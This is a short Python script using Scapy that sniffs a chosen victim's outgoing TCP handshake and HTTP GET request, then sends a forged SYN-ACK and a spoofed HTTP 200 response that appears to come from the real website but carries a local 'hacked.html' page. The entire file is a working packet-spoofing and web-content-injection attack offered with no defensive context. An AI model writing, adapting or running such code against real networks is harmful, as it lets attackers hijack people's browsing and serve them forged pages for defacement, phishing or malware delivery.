from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.http import HTTP
from random import randint

http_header = 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\n\r\n'

def handle_tcp_handshake(target_ip):
    print("Waiting For Syn")

    def filter_syn(raw_packet):
        if TCP in raw_packet and IP in raw_packet:
            return raw_packet[IP].src == target_ip and raw_packet[TCP].flags == 'S'

    target_syn = sniff(1, lfilter=filter_syn)[0]
    print("Syn Received")
    website = target_syn[IP].dst
    ack_seq = target_syn[TCP].seq + 1
    syn_seq = randint(0, 10000000)
    target_port = target_syn[TCP].sport
    target_ack = IP(src=website, dst=target_ip) / TCP(flags='SA', ack=ack_seq, seq=syn_seq, sport=80, dport=target_port)
    send(target_ack, verbose=False)


def handle_http_get_request(target_ip):
    handle_tcp_handshake(target_ip)

    print("Waiting For GET")

    def filter_get(raw_packet):
        if HTTP in raw_packet and IP in raw_packet:
            return raw_packet[IP].src == target_ip and raw_packet[HTTP].payload.Method == b'GET'

    target_get = sniff(1, lfilter=filter_get)[0]
    print("GET Received")
    ack_seq = target_get[TCP].seq + len(target_get[HTTP])
    syn_seq = target_get[TCP].ack
    website = target_get[IP].dst
    target_port = target_get[TCP].sport
    fin = open('hacked.html', 'r')
    html_file = fin.read()
    target_html = IP(src=website, dst=target_ip) \
                  / TCP(flags=0x18, ack=ack_seq, seq=syn_seq, sport=80, dport=target_port) \
                  / (http_header.format(len(html_file)) + html_file)
    send(target_html, verbose=False)
